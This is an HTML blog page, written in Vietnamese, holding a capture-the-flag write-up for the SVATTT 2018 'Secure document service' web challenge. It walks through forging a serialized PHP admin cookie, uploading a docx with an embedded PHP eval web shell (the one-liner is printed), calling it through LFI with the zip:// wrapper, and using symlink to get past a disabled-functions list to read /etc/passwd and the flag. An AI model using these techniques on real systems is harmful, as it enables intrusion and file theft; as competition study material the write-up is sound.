@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Hugo Theme  | SVATTT 2018 - Secure document service</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.1/css/bulma.min.css" />
+    <link rel="stylesheet" href="https://hungry-visvesvaraya-d246d6.netlify.com/css/blog.css" />
+    
+</head>
+<body>
+
+    
+    <nav class="navbar is-fixed-top" role="navigation" aria-label="main navigation">
+        <div class="navbar-brand">
+            <a class="navbar-item" href="https://hungry-visvesvaraya-d246d6.netlify.com/">Home</a>
+            <a class="navbar-item" href="https://hungry-visvesvaraya-d246d6.netlify.com/about">About</a>
+        </div>
+    </nav>
+    
+
+    
+    <section class="hero is-info is-medium">
+        <div class="hero-body" style="background-image: url(https://hungry-visvesvaraya-d246d6.netlify.com/img/bg-blog.jpg);">
+            <div class="container has-text-centered">
+                <br>
+                <h1 class="title is-size-1">
+                    
+                        SVATTT 2018 - Secure document service
+                    
+                </h1>
+                
+            </div>
+        </div>
+    </section>
+
+
+<div class="container">
+    <div class="section">
+    
+
+<div class="columns">
+    <div class="column is-9">
+        <div class="tile is-child box">
+            <div class="content">
+                
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/svattt18_01.png"/> 
+</figure>
+
+
+<h1 id="mô-tả">Mô tả</h1>
+
+<blockquote>
+<p>1000 points (<sup>1</sup>&frasl;<sub>68</sub> sovles)<br />
+I made a simple and secure web service for upload and share document. Can you read document to get a gift? :D<br />
+<a href="http://171.244.141.213:8337/">http://171.244.141.213:8337/</a></p>
+</blockquote>
+
+<h1 id="gợi-ý">Gợi ý</h1>
+
+<blockquote>
+<p>1.Flag in /tmp/fl4g.php<br />
+2.Wrapper<br />
+3.<a href="https://pastebin.com/g6XSfVfB">https://pastebin.com/g6XSfVfB</a></p>
+</blockquote>
+
+<h1 id="ý-tưởng">Ý tưởng</h1>
+
+<blockquote>
+<p>Tìm cách đăng nhập admin bằng&hellip; googling <img 
+	src="https://hungry-visvesvaraya-d246d6.netlify.com/emoji/lol.gif" 
+	width="30px" height="30px" 
+	style="display: inline;" 
+/>.<br />
+Upload file docx chứa mã độc (shell) và gọi ra bằng wrapper zip:// qua LFI.<br />
+Dùng symlink để bypass filter và đọc flag.</p>
+</blockquote>
+
+<h1 id="chi-tiết">Chi tiết</h1>
+
+<h2 id="bước-1-đăng-nhập-admin">Bước 1: Đăng nhập admin</h2>
+
+<p><code>&lt;!-- guest:guest account enabled --&gt;</code> đây là đoạn code comment cũng là hint của tác giả để đăng nhập vào bên trong. Hint này cũng nói lên 1 điều là tôi cần phải đăng nhập được tài khoản admin.
+Sau khi đăng nhập tôi nhận được 2 cookie mới:</p>
+
+<pre><code>Set-Cookie: auth=Tzo0OiJVc2VyIjoyOntzOjQ6InVzZXIiO3M6NToiZ3Vlc3QiO3M6NDoicGFzcyI7czo1OiJndWVzdCI7fQ%3D%3D; expires=Sat, 03-Nov-2018 06:32:36 GMT; Max-Age=7200; path=/
+Set-Cookie: check=MGFkN2ZkNzVjMTE4ZTM4ZGY5ZTc3YzZiMWJmNWI5ZDI%3D; expires=Sat, 03-Nov-2018 06:32:36 GMT; Max-Age=7200; path=/
+</code></pre>
+
+<p>đó cũng chính là đoạn dữ liệu này sau khi decode</p>
+
+<pre><code>auth=O:4:&quot;User&quot;:2:{s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:4:&quot;pass&quot;;s:5:&quot;guest&quot;;}
+check=0ad7fd75c118e38df9e77c6b1bf5b9d2
+</code></pre>
+
+<p>Tôi đã thử đăng nhập với tài khoản admin:admin mà không được, giờ có 2 cách có thể nghĩ ra nhanh là bruteforce mật khẩu dễ của tài khoản admin hoặc fuzz tìm lỗi gì đó như: sqli, &hellip; Mặc dù nghĩ vậy nhưng tôi lại làm cách thứ 3 là search google. <img 
+	src="https://hungry-visvesvaraya-d246d6.netlify.com/emoji/lol.gif" 
+	width="30px" height="30px" 
+	style="display: inline;" 
+/>
+Tìm kiếm <code>0ad7fd75c118e38df9e77c6b1bf5b9d2</code> trên google mục đích là xem chuỗi plain text là gì nhưng tôi lại tìm ra kết quả khác - writeup của 1 bài tương tự <img 
+	src="https://hungry-visvesvaraya-d246d6.netlify.com/emoji/beauty.gif" 
+	width="30px" height="30px" 
+	style="display: inline;" 
+/> <a href="https://www.zybuluo.com/shaobaobaoer/note/1214441">link</a>
+Thật ra link writeup trên đã nói lên cách làm của challenge này nhưng &hellip; sự thật chớ trêu, tôi lại không chịu đọc hết bài :((<br />
+Cuối cùng, chỉ cần copy cookie y như trong bài blog là vào được admin</p>
+
+<pre><code>Cookie: auth=Tzo0OiJVc2VyIjoyOntzOjQ6InVzZXIiO3M6NToiYWRtaW4iO3M6NDoicGFzcyI7YjoxO30%3D; check=Njg5N2YwMDYwYTg0ZWNiMDYwMGU0MTY3ZDJhNzQ4ZTQ%3D
+</code></pre>
+
+<h2 id="bước-2-upload-file-doc-docx">Bước 2: Upload file doc, docx</h2>
+
+<p>Bước này khá là tranh cãi, mà vì sao lại cãi thì tôi cũng không rõ. Cơ bản là không hiểu lý do vì sao mà đội này upload được mà đội kia lại không. Sau khi thời gian thi kết thúc, hỏi tác giả cũng không rõ vì sao ?????<br />
+Cùng với LFI ở param <code>page</code> + file upload thì đây chính là vector để gọi shell.</p>
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/svattt18_02.png"/> 
+</figure>
+
+
+<p>Nhưng cuộc sống không dễ dàng, tác giả đã add suffix là <code>.php</code> nên chỉ gọi được file php cùng với disable các wrapper thông thường thì có thánh mới đọc được source php <img 
+	src="https://hungry-visvesvaraya-d246d6.netlify.com/emoji/burn_joss_stick.gif" 
+	width="30px" height="30px" 
+	style="display: inline;" 
+/></p>
+
+<p>Từ hint của 1 đồng đội, bản chất của docx, doc, xls, ppt, &hellip; đều là zip. Để shell php nén cùng với docx tôi fuzz thử wrapper zip để gọi lên shell. Ngon ăn luôn.</p>
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/svattt18_03.png"/> 
+</figure>
+
+
+<p>Lên shell trông có vẻ đã đi đến đích rồi, nhưng không, thật sự không. Dưới đây là tất cả function bị disable.</p>
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/svattt18_04.png"/> 
+</figure>
+
+
+<p>Các bạn để ý, <code>eval</code> mình bôi đen trên hình là bị chặn nhưng đây là con shell mình up lên server <code>&lt;?php echo 'Lên shell rồi nhé !!!'; eval($_POST[&quot;kv&quot;]);</code>. <img 
+	src="https://hungry-visvesvaraya-d246d6.netlify.com/emoji/lovemachine.gif" 
+	width="30px" height="30px" 
+	style="display: inline;" 
+/> méo hiểu vì sao, chính vì sự magic đó dẫn đến bước 3.</p>
+
+<h2 id="bước-3-get-flag">Bước 3: Get flag</h2>
+
+<p>Mặc dù eval bị disable nhưng vẫn dùng được, không hiểu vì sao, có thể 1 lý do mà mình nghĩ đến là eval không phải function. Thế thì làm sao đọc flag??? Có 2 cách có thể nghĩ đến là suy nghĩ hướng khác, 2 là tìm function bị filter thiếu.<br />
+Kéo lên xem lại hình trên, các function bị disable trong đó có function symlink. Symlink chỉ mới vừa được thêm vào sau khi kết thúc thời gian thi. Thật ra dưới đây mới là các function bị disable.</p>
+
+<pre><code>eval, show_source, system, shell_exec, passthru, exec, popen, fopen, proc_open, mail, stream_wrapper_register, include, require, require_once, parse_ini_file, proc_open, curl_exec, set_time_limit, stream_wrapper_restore, file_get_contents, file_put_contents, readfile, copy, file, glob, parse_ini_file
+</code></pre>
+
+<p>Tôi và đồng đội cùng fuzz để tìm được symlink và cũng là cách mà tác giả không mong muốn. (unintend solution !!!).</p>
+
+<p>Vì không thể dùng symlink để writeup nữa nên mình demo hình ảnh của payload cũ cho các bạn xem</p>
+
+<p><figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/svattt18_05.png"/> 
+</figure>
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/svattt18_06.png"/> 
+</figure>
+</p>
+
+<p>Lần lượt truy cập vào <code>http://171.244.141.213:8337/uploads/asdfads.txt</code> và <code>http://171.244.141.213:8337/uploads/asdfsssads.txt</code> sẽ xem được nội dung file <code>/etc/passwd</code> và <code>/tmp/fl4g.php</code></p>
+
+<blockquote>
+<p>Ghi chú: Cách dùng fsock như ý tác giả các bạn có thể xem trong <a href="https://www.zybuluo.com/shaobaobaoer/note/1214441">link này</a><br />
+Chức năng <code>Contact</code> chỉ để cho có thôi, không có tác dụng gì trong đây cả nhưng cũng làm mình mất đến vài tiếng đồng hồ để ghép nối các manh mối lại với nhau cho logic <img 
+	src="https://hungry-visvesvaraya-d246d6.netlify.com/emoji/beat_brick.gif" 
+	width="30px" height="30px" 
+	style="display: inline;" 
+/><br />
+Vì sao mà symlink lúc thi không có nhưng khi writeup lại có thì tôi đang liên hệ tác giả để tìm hiểu thêm.<br />
+Link pastebin ở trên đầu bài từ lúc viết writeup là không truy cập được nữa</p>
+</blockquote>
+
+            </div>
+        </div>
+    </div>
+    <div class="column is-3">
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Tags</h1>
+        <div class="tags">
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/ctf">ctf</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/cve">cve</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/flask">flask</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/laravel">laravel</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/matesctf">matesctf</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/php">php</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/python">python</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/serialization">serialization</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/svattt-2018">svattt-2018</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/svattt-final-2018">svattt-final-2018</a></span>
+        
+        </div>          
+    </div>
+</div><br>
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Recent posts</h1>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/new_year_2019/">New year 2019</a></h1>
+            <time class="has-text-grey-light is-size-7">1 January 2019</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_final_2018_web_2_roundcube_mail/">SVATTT final 2018 - roundcube mail</a></h1>
+            <time class="has-text-grey-light is-size-7">20 November 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_2018_web_3_secure_document_service/">SVATTT 2018 - Secure document service</a></h1>
+            <time class="has-text-grey-light is-size-7">5 November 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/laravel-object-injection-to-rce/">Laravel object injection to RCE</a></h1>
+            <time class="has-text-grey-light is-size-7">25 October 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/php_object_injection_without_unserialize/">Php Object Injection Without Unserialize</a></h1>
+            <time class="has-text-grey-light is-size-7">20 September 2018</time>
+        
+    </div>
+</div>
+    <br>
+                
+  
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Related posts</h1>
+      
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_final_2018_web_2_roundcube_mail/">SVATTT final 2018 - roundcube mail</a></h1>
+            <time class="has-text-grey-light is-size-7">20 November 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf-final-2-brute-mongodb-_id/">Matesctf final 2 - Brute mongodb _id</a></h1>
+            <time class="has-text-grey-light is-size-7">13 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/meepwn_qual_round_web_pycalx_1/">Meepwn qual round - pycalx 1</a></h1>
+            <time class="has-text-grey-light is-size-7">11 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf_final_2_web_ex50_rce/">Matesctf final 2 - IP Spoofing to RCE in flask</a></h1>
+            <time class="has-text-grey-light is-size-7">8 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf_final_2_web_ex50_ssti/">Matesctf final 2 - SSTI</a></h1>
+            <time class="has-text-grey-light is-size-7">8 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf_final_2_web_ex50_xxe/">Matesctf final 2 - XXE Injection</a></h1>
+            <time class="has-text-grey-light is-size-7">8 September 2018</time>
+      
+    </div>
+</div>
+
+    
+<br>
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Archives</h1>
+        
+            <a href="https://hungry-visvesvaraya-d246d6.netlify.com/archives/2019">2019</a> (1)<br>
+        
+            <a href="https://hungry-visvesvaraya-d246d6.netlify.com/archives/2018">2018</a> (9)<br>
+        
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+    </div>
+    
+    <div id="disqus_thread"></div>
+</div>
+
+
+<script>
+
+
+
+
+var disqus_config = function () {
+this.page.url = "https:\/\/hungry-visvesvaraya-d246d6.netlify.com\/";  
+this.page.identifier = "blog-kev"; 
+};
+
+(function() { 
+var d = document, s = d.createElement('script');
+s.src = 'https://blog-kev.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+
+<footer class="footer has-background-grey-darker has-text-white">
+    <div class="content has-text-centered">
+        <p>
+            <span class="icon is-large"><a href="https://twitter.com/" class="mysocial"><i class="fab fa-twitter fa-3x"></i></a></span>&nbsp;&nbsp;
+            <span class="icon is-large"><a href="https://www.youtube.com/" class="mysocial"><i class="fab fa-youtube fa-3x"></i></a></span>&nbsp;&nbsp;
+            <span class="icon is-large"><a href="https://github.com/" class="mysocial"><i class="fab fa-github fa-3x"></i></a></span>&nbsp;&nbsp;
+            <br><br>
+            Copyright &copy; Hugo Theme 2019</a>
+        </p>
+    </div>
+</footer>
+
+<script defer src="https://use.fontawesome.com/releases/v5.1.0/js/all.js"></script>
+
+<script id="dsq-count-scr" src="//blog-kev.disqus.com/count.js" async></script>
+</body>
+</html>
